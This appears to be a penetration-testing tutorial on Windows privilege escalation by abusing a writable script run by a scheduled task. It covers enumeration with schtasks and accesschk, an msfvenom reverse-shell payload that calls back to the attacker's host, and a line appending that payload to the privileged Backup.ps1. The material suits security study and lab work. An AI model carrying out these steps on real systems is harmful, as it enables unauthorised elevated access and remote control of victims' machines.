Windows provides a built-in utility called Task Scheduler, which is accessible through the Control Panel or by searching for "Task Scheduler" in the Start menu

The ```schtasks``` command-line utility can be used in Windows systems to list, edit or create scheduled tasks.

It can be used in the following manner to view all existing tasks:
```
schtasks /query /fo LIST /v 
```
The Powershell Get-ScheduledTask utility can also be used to enumerate scheduled tasks:
```
Get-ScheduledTask | ft TaskName,TaskPath,State
```
Unfortunately for us, Windows will only allow standard users to view scheduled tasks that belong to them, so the only way to know if a scheduled task is running scripts or commands with elevated privileges is to enumerate the files in the system.

There are two main ways to exploit scheduled tasks in Windows:

* Weak File Permissions used for the script being run by the scheduled tasks
* Creating or modifying scheduled tasks (only works in older versions of Windows)
  

**Exploiting Weak File Permissions**


In the example below, the “Backup” scheduled task is running the Backup.ps1 Powershell script every day at 10:00am.

![Screenshot from 2024-09-30 02-53-23](https://github.com/user-attachments/assets/076a33fe-53a0-485d-9d94-5c5fcba6c639)

We will user accesschk.exe binary to identify whether the current user can modify the ```Backup.ps1``` script.
```
.\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
```
If we got `FILE_ALL_ACCESS`, we will on the right way.
![Screenshot from 2024-09-30 02-56-44](https://github.com/user-attachments/assets/8d41ba46-ecba-448d-bd20-1b98469ee254)

2. A reverse shell should be crafted:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<our ip> LPORT=1234 -f exe > shell.exe
```
3. Transferring the shell.exe file to the Windows victim machine using the Python web server
4. The next step is to set up a Netcat listener:

5.Since our user has access to edit the ```Backup.ps1``` script, the easiest way to exploit this is to simply add an extra line to it which will execute our shell:
```
echo path_to_shell >> path_to_scheduled_script
#EX
echo "C:\Users\lol\shell.exe" >> "C:\Users\Administrator\Desktop\Backup.ps1"
```
Once the scheduled task has run, the Powershell script was executed, connecting to the listener and therefore granting a remote shell.










